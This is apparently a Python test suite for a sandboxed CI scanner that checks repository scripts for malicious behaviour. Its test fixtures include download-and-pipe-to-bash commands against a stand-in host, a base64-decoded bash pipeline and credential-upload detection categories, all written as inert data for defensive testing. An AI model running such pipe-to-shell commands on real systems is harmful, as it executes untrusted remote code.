# Copyright (c) 2026, NVIDIA CORPORATION.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import contextlib
import copy
import hashlib
import importlib.util
import io
import json
import os
from pathlib import Path
import resource
import subprocess
import sys
import tempfile
import unittest
from unittest.mock import patch

SPEC = importlib.util.spec_from_file_location(
    "sonar_script_scan", Path(__file__).resolve().parents[1] / "script_scan.py"
)
scanner = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(scanner)

CLEAN_SCRIPT = "#!/bin/sh\nset -eu\nprintf '%s\\n' 'fixture build'\n"
TEST_IMAGE = "ghcr.io/nvidia/spark-rapids-common/sonar-script-scan:test"
IMAGE_ID = "sha256:" + "b" * 64


def image_metadata(architecture="amd64"):
    return {
        "Id": IMAGE_ID,
        "Os": "linux",
        "Architecture": architecture,
        "Config": {"Labels": {scanner.SCANNER_VERSION_LABEL: scanner.SCANNER_VERSION}},
    }


def behavior(identifier="exec/shell/exec", rule="calls_shell", severity="MEDIUM"):
    return {
        "ID": identifier,
        "RuleName": rule,
        "RiskLevel": severity,
        "RiskScore": {"LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}[severity],
        "Description": "PRIVATE_DESCRIPTION",
        "MatchStrings": ["PRIVATE_SOURCE\n::warning::injected"],
    }


def identity(contents, shell_pipe=False):
    data = contents.encode() if isinstance(contents, str) else contents
    return {
        "sha256": hashlib.sha256(data).hexdigest(),
        "size": len(data),
        "shell_pipe": shell_pipe,
    }


def report(manifest, behaviors=None):
    findings = [behavior()] if behaviors is None else behaviors
    files = {}
    for name, metadata in manifest.items():
        if "gitlink" in metadata or metadata["size"] == 0:
            continue
        path = "/source/" + name
        files[path] = {
            "Path": path,
            "SHA256": metadata["sha256"],
            "Size": metadata["size"],
            "Behaviors": copy.deepcopy(findings),
            "RiskScore": max((item["RiskScore"] for item in findings), default=0),
            "RiskLevel": max(
                findings,
                key=lambda item: item["RiskScore"],
                default={"RiskLevel": "NONE"},
            )["RiskLevel"],
        }
    return {
        "Files": files,
        "Stats": {"ProcessedFiles": len(files), "SkippedFiles": 0},
    }


def result(sha="a" * 40, findings=None):
    return {
        "sha": sha,
        "findings": findings or [],
        "file_count": 1,
        "empty_files": 0,
        "submodules": [],
    }


class GitFixture(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.addCleanup(self.directory.cleanup)
        self.root = Path(self.directory.name)
        self.source = self.root / "source"
        self.source.mkdir()
        self.git_environment = {
            "PATH": os.defpath,
            "HOME": str(self.root),
            "GIT_CONFIG_NOSYSTEM": "1",
            "GIT_CONFIG_GLOBAL": os.devnull,
            "GIT_DEFAULT_HASH": "sha1",
            "LC_ALL": "C",
        }
        self.git("init", "--quiet")
        self.write("ci/build.sh", CLEAN_SCRIPT)
        self.sha = self.commit()

    def git(self, *arguments):
        return subprocess.check_output(
            ["git", "-C", str(self.source), *arguments],
            env=self.git_environment,
            stderr=subprocess.PIPE,
            text=True,
        ).strip()

    def write(self, name, contents):
        path = self.source / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(contents)
        return path

    def commit(self):
        self.git("add", "--all", "--force")
        self.git(
            "-c",
            "user.name=Test Author",
            "-c",
            "user.email=test@example.invalid",
            "-c",
            "commit.gpgsign=false",
            "commit",
            "--quiet",
            "-m",
            "Fixture snapshot",
        )
        return self.git("rev-parse", "HEAD")

    def snapshot(self):
        destination = Path(tempfile.mkdtemp(dir=self.root))
        return destination, scanner.snapshot_inputs(self.source, self.sha, destination)


class SnapshotTests(GitFixture):
    def test_checkout_requires_full_approved_sha_and_repository_root(self):
        self.assertEqual(scanner.checkout_sha(self.source, self.sha.upper()), self.sha)
        for expected in ("HEAD", self.sha[:12], "a" * 40, "-" + self.sha[1:]):
            with self.subTest(expected=expected):
                with self.assertRaises(scanner.ScanError):
                    scanner.checkout_sha(self.source, expected)
        with self.assertRaises(scanner.ScanError):
            scanner.checkout_sha(self.source / "ci", self.sha)

    def test_snapshot_uses_committed_content_including_ignored_and_hidden_files(self):
        committed = {
            "ci/build.sh": CLEAN_SCRIPT,
            "pom.xml": "<project><modelVersion>4.0.0</modelVersion></project>\n",
            ".hidden/task.py": "print('static fixture')\n",
            ".gitignore": "*\n",
            ".gitattributes": "ci/build.sh export-ignore\n",
        }
        for name, contents in committed.items():
            self.write(name, contents)
        self.sha = self.commit()
        self.write("ci/build.sh", "uncommitted replacement")
        self.write("untracked.sh", "untracked content")

        destination, manifest = self.snapshot()

        self.assertEqual(
            manifest, {name: identity(data) for name, data in committed.items()}
        )
        for name, contents in committed.items():
            self.assertEqual((destination / name).read_text(), contents)
        self.assertFalse((destination / ".git").exists())
        self.assertFalse((destination / "untracked.sh").exists())

    def test_symlinks_are_rejected_without_reading_external_content(self):
        outside = self.root / "outside"
        outside.write_text("PRIVATE_EXTERNAL")
        (self.source / "linked.sh").symlink_to(outside)
        self.sha = self.commit()
        with self.assertRaises(scanner.ScanError):
            self.snapshot()

    def test_control_characters_in_paths_are_rejected(self):
        self.write("bad\nname.sh", CLEAN_SCRIPT)
        self.sha = self.commit()
        with self.assertRaises(scanner.ScanError):
            self.snapshot()

    def test_gitlinks_are_not_silently_reported_as_scanned(self):
        self.git("update-index", "--add", "--cacheinfo", f"160000,{self.sha},vendor")
        self.git(
            "-c",
            "user.name=Test Author",
            "-c",
            "user.email=test@example.invalid",
            "-c",
            "commit.gpgsign=false",
            "commit",
            "--quiet",
            "-m",
            "Add gitlink",
        )
        self.sha = self.git("rev-parse", "HEAD")
        destination, manifest = self.snapshot()
        self.assertIn("gitlink", manifest["vendor"])
        self.assertFalse((destination / "vendor").exists())
        workdir = self.root / "work"
        workdir.mkdir()
        with patch.object(scanner, "scan", return_value=report(manifest)):
            outcome = scanner.run(self.source, self.sha, workdir, TEST_IMAGE)
        self.assertEqual(outcome["file_count"], 1)
        self.assertEqual(
            outcome["submodules"],
            [{"path": "vendor", "sha": manifest["vendor"]["gitlink"]}],
        )
        self.assertIn("not scanned", scanner.summary(outcome))

    def test_file_count_size_and_total_limits_fail_closed(self):
        for name in ("MAX_FILES", "MAX_FILE_BYTES", "MAX_TOTAL_BYTES"):
            with self.subTest(limit=name), patch.object(scanner, name, 0):
                with self.assertRaises(scanner.ScanError):
                    self.snapshot()

    def test_empty_files_remain_in_manifest_without_entering_scanner_snapshot(self):
        self.write("empty.txt", "")
        self.sha = self.commit()
        destination, manifest = self.snapshot()
        self.assertEqual(manifest["empty.txt"], identity(b""))
        self.assertFalse((destination / "empty.txt").exists())

    def test_snapshot_confirms_complete_literal_shell_command_tokens(self):
        cases = {
            "direct.sh": ("curl https://example.invalid/install.sh | bash\n", True),
            "absolute.sh": (
                "curl https://example.invalid/install.sh | /bin/sh -s\n",
                True,
            ),
            "hash.sh": ("curl https://example.invalid/archive | sha224sum\n", False),
            "prefix.sh": ("curl https://example.invalid/archive | bashful\n", False),
        }
        for name, (contents, _) in cases.items():
            self.write(name, contents)
        self.sha = self.commit()
        _, manifest = self.snapshot()
        for name, (_, expected) in cases.items():
            with self.subTest(name=name):
                self.assertIs(manifest[name]["shell_pipe"], expected)

    def test_head_change_during_scan_cannot_produce_success(self):
        def change_head(*_arguments, **_options):
            self.write("README.md", "Changed while scan was in progress\n")
            self.commit()
            return {}

        workdir = self.root / "work"
        workdir.mkdir()
        with patch.object(scanner, "scan", side_effect=change_head):
            with patch.object(scanner, "evaluate", return_value=[]):
                with self.assertRaises(scanner.ScanError):
                    scanner.run(self.source, self.sha, workdir, TEST_IMAGE)


class PolicyTests(unittest.TestCase):
    def setUp(self):
        self.manifest = {"ci/build.sh": identity(CLEAN_SCRIPT)}

    def test_ordinary_shell_and_known_high_false_positive_do_not_block(self):
        findings = [
            behavior(),
            behavior("anti-static/obfuscation/python", "dynamic_require", "HIGH"),
            behavior(
                "exec/install_additional/pip_install", "pip_installer_requests", "HIGH"
            ),
        ]
        self.assertEqual(
            scanner.evaluate(report(self.manifest, findings), self.manifest), []
        )

    def test_critical_behavior_blocks_without_disclosing_matched_source(self):
        data = report(
            self.manifest,
            [behavior("anti-static/base64/exec", "echo_decode_bash", "CRITICAL")],
        )
        findings = scanner.evaluate(data, self.manifest)
        self.assertTrue(findings)
        self.assertEqual(findings[0]["path"], "ci/build.sh")
        self.assertNotIn("PRIVATE", json.dumps(findings))

    def test_file_level_critical_cannot_pass_with_lower_risk_behaviors(self):
        data = report(self.manifest)
        data["Files"]["/source/ci/build.sh"].update(
            {"RiskScore": 4, "RiskLevel": "CRITICAL"}
        )
        self.assertTrue(scanner.evaluate(data, self.manifest))

    def test_unsupported_report_modes_and_file_severity_fail_closed(self):
        for field in ("Error", "Diff"):
            data = report(self.manifest)
            data[field] = {"message": "PRIVATE_DIAGNOSTIC"}
            with self.subTest(field=field):
                with self.assertRaises(scanner.ScanError):
                    scanner.evaluate(data, self.manifest)
        for changes in (
            {"RiskScore": True},
            {"RiskScore": 7},
            {"RiskLevel": "UNEXPECTED"},
            {"Behaviors": []},
        ):
            data = report(self.manifest)
            data["Files"]["/source/ci/build.sh"].update(changes)
            with self.subTest(changes=changes):
                with self.assertRaises(scanner.ScanError):
                    scanner.evaluate(data, self.manifest)

    def test_download_shell_pipeline_blocks_despite_rule_name_deduplication(self):
        manifest = {"ci/build.sh": identity(CLEAN_SCRIPT, shell_pipe=True)}
        for rule in ("pipe_to_shell", "replacement_rule_name"):
            dangerous = [
                behavior("exec/shell/pipe_sh", rule),
                behavior("c2/tool_transfer/shell", "sleep_rm"),
            ]
            with self.subTest(rule=rule):
                self.assertTrue(scanner.evaluate(report(manifest, dangerous), manifest))
        for categories in (
            [behavior("exec/shell/pipe_sh", "pipe_to_shell")],
            [behavior("c2/tool_transfer/shell", "dev_null_rm")],
        ):
            with self.subTest(categories=categories):
                self.assertEqual(
                    scanner.evaluate(report(manifest, categories), manifest), []
                )
        self.assertEqual(
            scanner.evaluate(report(self.manifest, dangerous), self.manifest), []
        )

    def test_shell_token_evidence_requires_a_boolean_from_the_snapshot(self):
        data = report(self.manifest)
        for value in (None, 0, "true"):
            manifest = copy.deepcopy(self.manifest)
            manifest["ci/build.sh"]["shell_pipe"] = value
            with self.subTest(value=value):
                with self.assertRaises(scanner.ScanError):
                    scanner.evaluate(data, manifest)
        manifest = copy.deepcopy(self.manifest)
        manifest["ci/build.sh"].pop("shell_pipe")
        with self.assertRaises(scanner.ScanError):
            scanner.evaluate(data, manifest)

    def test_credential_upload_requires_both_indicators_in_the_same_file(self):
        credential = behavior("credential/cloud/aws", "aws_folder")
        upload = behavior("exfil/curl_post", "curl_post")
        for one in (credential, upload):
            with self.subTest(rule=one["RuleName"]):
                self.assertEqual(
                    scanner.evaluate(report(self.manifest, [one]), self.manifest), []
                )
        self.assertTrue(
            scanner.evaluate(report(self.manifest, [credential, upload]), self.manifest)
        )
        renamed = [copy.deepcopy(credential), copy.deepcopy(upload)]
        for item in renamed:
            item["RuleName"] = "replacement_rule_name"
        self.assertTrue(scanner.evaluate(report(self.manifest, renamed), self.manifest))

        manifest = {**self.manifest, "api.sh": identity("echo unrelated\n")}
        data = report(manifest, [credential])
        data["Files"]["/source/api.sh"]["Behaviors"] = [upload]
        self.assertEqual(scanner.evaluate(data, manifest), [])

    def test_known_no_finding_placeholder_has_exact_path_and_shape(self):
        data = report(self.manifest)
        path = "/source/ci/build.sh"
        data["Files"][path] = {"Path": path, "SHA256": "", "Size": 0, "RiskScore": 0}
        self.assertEqual(scanner.evaluate(data, self.manifest), [])
        for changes in (
            {"Skipped": "read failed"},
            {"Size": 1},
            {"Path": "/wrong/path"},
        ):
            invalid = copy.deepcopy(data)
            invalid["Files"][path].update(changes)
            with self.subTest(changes=changes):
                with self.assertRaises(scanner.ScanError):
                    scanner.evaluate(invalid, self.manifest)

    def test_incomplete_or_invalid_processing_statistics_fail_closed(self):
        complete = report(self.manifest)
        complete["Stats"].pop("SkippedFiles")
        self.assertEqual(scanner.evaluate(complete, self.manifest), [])
        for statistics in (
            None,
            {},
            {"ProcessedFiles": 0, "SkippedFiles": 0},
            {"ProcessedFiles": 1, "SkippedFiles": 1},
            {"ProcessedFiles": True, "SkippedFiles": 0},
        ):
            data = report(self.manifest)
            data["Stats"] = statistics
            with self.subTest(statistics=statistics):
                with self.assertRaises(scanner.ScanError):
                    scanner.evaluate(data, self.manifest)

    def test_missing_skipped_extra_or_mismatched_files_fail_closed(self):
        valid = report(self.manifest)
        path = "/source/ci/build.sh"
        cases = []
        data = copy.deepcopy(valid)
        data["Files"].pop(path)
        cases.append(data)
        for field, value in (
            ("Skipped", "failed to read"),
            ("SHA256", "0" * 64),
            ("Size", len(CLEAN_SCRIPT) + 1),
            ("Path", "/outside/build.sh"),
        ):
            data = copy.deepcopy(valid)
            data["Files"][path][field] = value
            cases.append(data)
        data = copy.deepcopy(valid)
        data["Files"]["/source/unknown.sh"] = data["Files"][path]
        cases.append(data)
        for data in cases:
            with self.subTest(report=data):
                with self.assertRaises(scanner.ScanError):
                    scanner.evaluate(data, self.manifest)

    def test_malformed_schema_and_unsafe_rule_data_fail_closed(self):
        for invalid in (
            None,
            [],
            {},
            {"Files": []},
            {"Files": {"/source/ci/build.sh": None}},
        ):
            with self.subTest(report=invalid):
                with self.assertRaises(scanner.ScanError):
                    scanner.evaluate(invalid, self.manifest)
        for field, value in (
            ("ID", "bad\n::warning::injected"),
            ("RuleName", "bad\n::warning::injected"),
            ("RiskLevel", "UNEXPECTED"),
        ):
            finding = behavior()
            finding[field] = value
            with self.subTest(field=field):
                with self.assertRaises(scanner.ScanError):
                    scanner.evaluate(report(self.manifest, [finding]), self.manifest)


class ProcessTests(unittest.TestCase):
    def test_output_is_bounded_on_disk_without_changing_parent_limits(self):
        before = resource.getrlimit(resource.RLIMIT_FSIZE)
        with tempfile.TemporaryFile() as output:
            with patch.object(
                scanner.tempfile,
                "TemporaryFile",
                return_value=contextlib.nullcontext(output),
            ):
                with self.assertRaises(scanner.ScanError):
                    scanner.command_output(
                        [sys.executable, "-c", "import os; os.write(1, b'x' * 4096)"],
                        limit=32,
                    )
            self.assertLessEqual(output.seek(0, os.SEEK_END), 33)
        self.assertEqual(resource.getrlimit(resource.RLIMIT_FSIZE), before)

    def test_child_environment_does_not_receive_inherited_credentials_or_config(self):
        secrets = {
            "GITHUB_TOKEN": "PRIVATE_TOKEN",
            "GH_TOKEN": "PRIVATE_TOKEN",
            "SONAR_TOKEN": "PRIVATE_TOKEN",
            "DOCKER_CONFIG": "/untrusted/config",
            "DOCKER_HOST": "tcp://untrusted.invalid:2375",
            "PYTHONPATH": "/untrusted/python",
            "MALCONTENT_REGISTRY_PASS": "PRIVATE_TOKEN",
        }
        with patch.dict(os.environ, secrets):
            output = scanner.command_output(
                [
                    sys.executable,
                    "-c",
                    "import json, os; print(json.dumps(dict(os.environ)))",
                ]
            )
        environment = json.loads(output)
        for name in secrets:
            self.assertNotIn(name, environment)


class DockerTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.addCleanup(self.directory.cleanup)
        self.root = Path(self.directory.name)
        self.snapshot = self.root / "source"
        self.snapshot.mkdir()
        self.prefix = ["docker", "--host", "unix:///test.sock"]

    def test_docker_config_and_endpoint_are_not_taken_from_the_checkout_environment(
        self,
    ):
        with patch.dict(
            os.environ,
            {
                "DOCKER_CONFIG": "/untrusted/config",
                "DOCKER_HOST": "tcp://untrusted.invalid",
            },
        ):
            with patch.object(scanner.shutil, "which", return_value="/usr/bin/docker"):
                prefix = scanner.docker_command(self.root)
        self.assertEqual(prefix[prefix.index("--host") + 1], scanner.DOCKER_HOST)
        config = Path(prefix[prefix.index("--config") + 1])
        self.assertEqual(config, self.root / "docker-config")
        self.assertEqual(config.stat().st_mode & 0o777, 0o700)

    def test_scanner_freezes_image_identity_in_read_only_networkless_container(self):
        calls = []

        def execute(command, **options):
            calls.append((command, options))
            if "inspect" in command:
                return json.dumps(image_metadata()).encode()
            return b"{}" if "run" in command else b""

        with patch.object(scanner, "docker_command", return_value=self.prefix):
            with patch.object(scanner, "command_output", side_effect=execute):
                self.assertEqual(
                    scanner.scan(
                        self.snapshot, self.root, TEST_IMAGE, platform="linux/amd64"
                    ),
                    {},
                )
        run = next(command for command, _ in calls if "run" in command)
        self.assertIn(IMAGE_ID, run)
        self.assertNotIn(TEST_IMAGE, run)
        self.assertEqual(
            [command for command, _ in calls if "pull" in command],
            [
                self.prefix
                + ["pull", "--quiet", "--platform", "linux/amd64", TEST_IMAGE]
            ],
        )
        self.assertEqual(sum("inspect" in command for command, _ in calls), 1)
        for flag, value in (
            ("--pull", "never"),
            ("--platform", "linux/amd64"),
            ("--network", "none"),
            ("--cap-drop", "ALL"),
            ("--security-opt", "no-new-privileges"),
            ("--user", "65532:65532"),
            ("--entrypoint", "/usr/bin/mal"),
            ("--format", "json"),
        ):
            self.assertEqual(run[run.index(flag) + 1], value)
        for flag in (
            "--read-only",
            "--include-data-files",
            "--exit-extraction",
            "--exit-on-extractor-panic",
        ):
            self.assertIn(flag, run)
        mount = run[run.index("--mount") + 1]
        self.assertIn("target=/source,readonly", mount)
        self.assertNotIn("docker.sock", mount)
        self.assertNotIn("--env", run)
        self.assertNotIn("--env-file", run)
        self.assertNotIn("--privileged", run)
        self.assertTrue(all(options.get("timeout", 1) > 0 for _, options in calls))

    def test_local_image_ids_skip_pull_but_still_verify_version_and_platform(self):
        with patch.object(
            scanner,
            "command_output",
            return_value=json.dumps(image_metadata("arm64")).encode(),
        ) as execute:
            self.assertEqual(
                scanner.resolve_image(self.prefix, IMAGE_ID, "linux/arm64"), IMAGE_ID
            )
        self.assertEqual(execute.call_count, 1)
        self.assertEqual(
            execute.call_args.args[0],
            self.prefix + ["image", "inspect", "--format", "{{json .}}", IMAGE_ID],
        )

    def test_registry_digest_requires_a_successful_pull(self):
        reference = TEST_IMAGE.split(":")[0] + "@sha256:" + "c" * 64
        with patch.object(
            scanner,
            "command_output",
            side_effect=[b"", json.dumps(image_metadata()).encode()],
        ) as execute:
            self.assertEqual(scanner.resolve_image(self.prefix, reference), IMAGE_ID)
        self.assertEqual(
            execute.call_args_list[0].args[0],
            self.prefix + ["pull", "--quiet", reference],
        )
        with patch.object(scanner, "docker_command", return_value=self.prefix):
            with patch.object(
                scanner,
                "command_output",
                side_effect=scanner.ScanError("Scanner image pull failed"),
            ) as execute:
                with self.assertRaises(scanner.ScanError):
                    scanner.scan(self.snapshot, self.root, reference)
        execute.assert_called_once()
        self.assertIn("pull", execute.call_args.args[0])

    def test_malformed_references_and_unsupported_platforms_fail_before_docker(self):
        for reference in (
            "",
            None,
            "ghcr.io/nvidia/scanner",
            "ghcr.io/nvidia/scanner:",
            "ghcr.io/nvidia/scanner@sha256:abc",
            "--privileged",
            "ghcr.io/nvidia/scanner:test\n--privileged",
            "https://ghcr.io/nvidia/scanner:test",
            "sha256:abc",
        ):
            with self.subTest(reference=reference):
                with patch.object(scanner, "command_output") as execute:
                    with self.assertRaises(scanner.ScanError):
                        scanner.resolve_image(self.prefix, reference)
                execute.assert_not_called()
        with patch.object(scanner, "command_output") as execute:
            with self.assertRaises(scanner.ScanError):
                scanner.resolve_image(self.prefix, TEST_IMAGE, "linux/s390x")
        execute.assert_not_called()

    def test_invalid_image_identity_and_scanner_labels_fail_before_run(self):
        invalid = [None, [], {}, {"Id": IMAGE_ID, "Config": {"Labels": None}}]
        for field, value in (("Id", TEST_IMAGE), ("Config", {"Labels": {}})):
            metadata = image_metadata()
            metadata[field] = value
            invalid.append(metadata)
        metadata = image_metadata()
        metadata["Config"]["Labels"][scanner.SCANNER_VERSION_LABEL] = "unreviewed"
        invalid.append(metadata)
        for metadata in invalid:
            with self.subTest(metadata=metadata):
                with patch.object(scanner, "docker_command", return_value=self.prefix):
                    with patch.object(
                        scanner,
                        "command_output",
                        return_value=json.dumps(metadata).encode(),
                    ) as execute:
                        with self.assertRaises(scanner.ScanError):
                            scanner.scan(self.snapshot, self.root, IMAGE_ID)
                self.assertFalse(
                    any("run" in call.args[0] for call in execute.call_args_list)
                )

    def test_platform_mismatch_or_missing_architecture_fails_before_run(self):
        for architecture in ("arm64", None):
            with self.subTest(architecture=architecture):
                with patch.object(scanner, "docker_command", return_value=self.prefix):
                    with patch.object(
                        scanner,
                        "command_output",
                        return_value=json.dumps(image_metadata(architecture)).encode(),
                    ) as execute:
                        with self.assertRaises(scanner.ScanError):
                            scanner.scan(
                                self.snapshot,
                                self.root,
                                IMAGE_ID,
                                platform="linux/amd64",
                            )
                self.assertFalse(
                    any("run" in call.args[0] for call in execute.call_args_list)
                )

    def test_timeout_and_cancellation_still_cleanup_only_owned_container(self):
        for failure in (subprocess.TimeoutExpired("docker", 1), KeyboardInterrupt()):
            calls = []
            container_id = "c" * 64

            def execute(command, **_options):
                calls.append(command)
                if "inspect" in command:
                    return json.dumps(image_metadata()).encode()
                if "run" in command:
                    raise failure
                if "ls" in command:
                    return (container_id + "\n").encode()
                return b""

            with self.subTest(failure=type(failure).__name__):
                with patch.object(scanner, "docker_command", return_value=self.prefix):
                    with patch.object(scanner, "command_output", side_effect=execute):
                        with self.assertRaises(type(failure)):
                            scanner.scan(self.snapshot, self.root, TEST_IMAGE)
                run = next(command for command in calls if "run" in command)
                name = run[run.index("--name") + 1]
                listing = next(command for command in calls if "ls" in command)
                self.assertIn(f"label={scanner.OWNER_LABEL}={name}", listing)
                removals = [command for command in calls if "rm" in command]
                self.assertEqual(len(removals), 1)
                self.assertEqual(removals[0][-1], container_id)

    def test_ambiguous_or_invalid_cleanup_identity_never_removes_anything(self):
        for listing in (b"a\nb\n", b"not-a-container-id\n"):
            with self.subTest(listing=listing):
                with patch.object(
                    scanner, "command_output", return_value=listing
                ) as execute:
                    with self.assertRaises(scanner.ScanError):
                        scanner.cleanup_container(self.prefix, "script-scan-test")
                self.assertFalse(
                    any("rm" in call.args[0] for call in execute.call_args_list)
                )

    def test_invalid_json_and_cleanup_failure_cannot_produce_a_pass(self):
        def execute(command, **_options):
            if "inspect" in command:
                return json.dumps(image_metadata()).encode()
            return b"not-json" if "run" in command else b""

        with patch.object(scanner, "docker_command", return_value=self.prefix):
            with patch.object(scanner, "command_output", side_effect=execute):
                with self.assertRaises(scanner.ScanError):
                    scanner.scan(self.snapshot, self.root, TEST_IMAGE)
            with patch.object(scanner, "command_output", side_effect=execute):
                with patch.object(
                    scanner,
                    "cleanup_container",
                    side_effect=scanner.ScanError("Cleanup failed"),
                ):
                    with self.assertRaisesRegex(scanner.ScanError, "Cleanup failed"):
                        scanner.scan(self.snapshot, self.root, TEST_IMAGE)


class EntrypointTests(GitFixture):
    def setUp(self):
        super().setUp()
        self.output = self.root / "output"
        self.summary = self.root / "summary"
        self.environment = {
            "RUNNER_ENVIRONMENT": "github-hosted",
            "GITHUB_WORKSPACE": str(self.source),
            "RUNNER_TEMP": str(self.root),
            "INPUT_SOURCE_DIRECTORY": ".",
            "INPUT_EXPECTED_SHA": self.sha,
            "INPUT_IMAGE": TEST_IMAGE,
            "GITHUB_OUTPUT": str(self.output),
            "GITHUB_STEP_SUMMARY": str(self.summary),
        }

    def main(self, **environment):
        stdout = io.StringIO()
        with patch.dict(os.environ, {**self.environment, **environment}, clear=True):
            with patch.object(scanner.platform, "system", return_value="Linux"):
                with contextlib.redirect_stdout(stdout):
                    code = scanner.main()
        return code, stdout.getvalue()

    def test_success_outputs_are_bound_to_the_verified_commit(self):
        with patch.object(scanner, "run", return_value=result(self.sha)) as run:
            code, _ = self.main(INPUT_EXPECTED_SHA=self.sha.upper())
        self.assertEqual(code, 0)
        self.assertEqual(run.call_args.args[3], TEST_IMAGE)
        self.assertIn(f"sha={self.sha}\n", self.output.read_text())
        self.assertIn("passed=true\n", self.output.read_text())
        self.assertIn("PASS", self.summary.read_text())

    def test_public_action_rejects_local_image_ids_before_scanning(self):
        with patch.object(scanner, "run") as run:
            code, _ = self.main(INPUT_IMAGE=IMAGE_ID)
        self.assertEqual(code, 1)
        self.assertFalse(self.output.exists())
        run.assert_not_called()

    def test_findings_block_and_never_create_success_outputs(self):
        findings = [
            {"path": "ci/build.sh", "rule": "unsafe-execution", "severity": "CRITICAL"}
        ]
        with patch.object(scanner, "run", return_value=result(self.sha, findings)):
            code, stdout = self.main()
        self.assertEqual(code, 1)
        self.assertFalse(self.output.exists())
        self.assertIn("unsafe-execution", stdout + self.summary.read_text())

    def test_errors_and_cancellation_do_not_echo_private_diagnostics(self):
        for failure, expected in (
            (OSError("PRIVATE_PATH"), 1),
            (json.JSONDecodeError("PRIVATE_REPORT", "", 0), 1),
            (subprocess.TimeoutExpired("PRIVATE_COMMAND", 1), 1),
            (KeyboardInterrupt(), 130),
        ):
            with self.subTest(failure=type(failure).__name__):
                with patch.object(scanner, "run", side_effect=failure):
                    code, stdout = self.main()
                self.assertEqual(code, expected)
                self.assertNotIn("PRIVATE", stdout)
                self.assertFalse(self.output.exists())

    def test_wrong_runner_or_source_rejected_before_scanning(self):
        for environment in (
            {"RUNNER_ENVIRONMENT": "self-hosted"},
            {"INPUT_SOURCE_DIRECTORY": ".."},
        ):
            with self.subTest(environment=environment):
                with patch.object(scanner, "run") as run:
                    code, _ = self.main(**environment)
                self.assertEqual(code, 1)
                run.assert_not_called()

    def test_summary_is_bounded_and_escapes_untrusted_paths(self):
        findings = [
            {
                "path": "check[link]<tag>.sh",
                "rule": "unsafe-execution",
                "severity": "CRITICAL",
            }
            for _ in range(25)
        ]
        text = scanner.summary(result(self.sha, findings))
        self.assertEqual(text.count("unsafe-execution"), 20)
        self.assertNotIn("[link]", text)
        self.assertNotIn("<tag>", text)


@unittest.skipUnless(
    os.environ.get("SONAR_SCRIPT_SCAN_REAL_IMAGE") == "1",
    "Enable the owned image smoke tests explicitly",
)
class RealImageTests(GitFixture):
    @classmethod
    def setUpClass(cls):
        cls.docker_host = subprocess.check_output(
            ["docker", "context", "inspect", "--format", "{{.Endpoints.docker.Host}}"],
            text=True,
            timeout=15,
        ).strip()
        cls.platform = os.environ.get("SONAR_SCRIPT_SCAN_TEST_PLATFORM") or None
        docker = ["docker", "--host", cls.docker_host]
        platform_options = ["--platform", cls.platform] if cls.platform else []
        supplied_image = os.environ.get("SONAR_SCRIPT_SCAN_TEST_IMAGE")
        if supplied_image:
            # The publisher already built or pulled this reference for the platform.
            # Freeze its local identity so pre-publication tags need no registry pull.
            cls.image = subprocess.check_output(
                [*docker, "image", "inspect", "--format", "{{.Id}}", supplied_image],
                text=True,
                timeout=30,
            ).strip()
        else:
            repository = Path(__file__).resolve().parents[2]
            catalog = json.loads((repository / ".github/image-builds.json").read_text())
            recipe = catalog["sonar-script-scan"]
            with tempfile.TemporaryDirectory(prefix="script-scan-image-") as directory:
                image_id_file = Path(directory) / "image-id"
                subprocess.run(
                    [
                        *docker,
                        "build",
                        "--pull",
                        "--iidfile",
                        str(image_id_file),
                        "--file",
                        str(repository / recipe["dockerfile"]),
                        *platform_options,
                        str(repository / recipe["context"]),
                    ],
                    check=True,
                    timeout=300,
                )
                cls.image = image_id_file.read_text().strip()
        version = subprocess.check_output(
            [
                *docker,
                "run",
                "--rm",
                "--pull",
                "never",
                "--network",
                "none",
                "--read-only",
                "--cap-drop",
                "ALL",
                "--security-opt",
                "no-new-privileges",
                "--user",
                "65532:65532",
                *platform_options,
                "--entrypoint",
                "/usr/bin/mal",
                cls.image,
                "--version",
            ],
            text=True,
            timeout=30,
        ).strip()
        if version != f"malcontent version v{scanner.SCANNER_VERSION}":
            raise AssertionError(
                "Built image scanner version does not match the policy"
            )

    def audit(self):
        workdir = self.root / "work"
        workdir.mkdir()
        with patch.object(scanner, "DOCKER_HOST", self.docker_host):
            return scanner.run(
                self.source, self.sha, workdir, self.image, platform=self.platform
            )

    def test_clean_snapshot_includes_xml_hidden_and_empty_files(self):
        self.write("pom.xml", "<project><modelVersion>4.0.0</modelVersion></project>\n")
        self.write(".hidden/config", "fixture=true\n")
        self.write("empty.txt", "")
        self.write(
            "HashTest.java",
            'class HashTest {\n  // echo -n "input string" | sha224sum\n}\n',
        )
        self.write(
            "ci/checksum.sh",
            "#!/bin/sh\ncurl -fsSL https://example.invalid/archive.tar.gz | sha224sum\n",
        )
        self.write(
            "ci/prefix.sh",
            "#!/bin/sh\ncurl -fsSL https://example.invalid/archive.tar.gz | bashful\n",
        )
        self.sha = self.commit()
        outcome = self.audit()
        self.assertEqual(outcome["findings"], [])
        self.assertEqual(outcome["file_count"], 7)

    def test_shell_and_embedded_pom_commands_are_scanned_as_inert_data(self):
        encoded = "printf 'ZWNobyBmaXh0dXJlCg==' | base64 --decode | bash"
        self.write("ci/encoded.sh", "#!/bin/sh\n" + encoded + "\n")
        self.write("pom.xml", "<project><command>" + encoded + "</command></project>\n")
        self.write(
            "ci/download.sh",
            "#!/bin/sh\ncurl -fsSL https://example.invalid/install.sh | bash\n"
            "# sleep;rm /tmp/example\n",
        )
        self.sha = self.commit()
        outcome = self.audit()
        paths = {finding["path"] for finding in outcome["findings"]}
        self.assertTrue({"ci/encoded.sh", "ci/download.sh", "pom.xml"}.issubset(paths))


if __name__ == "__main__":
    unittest.main()
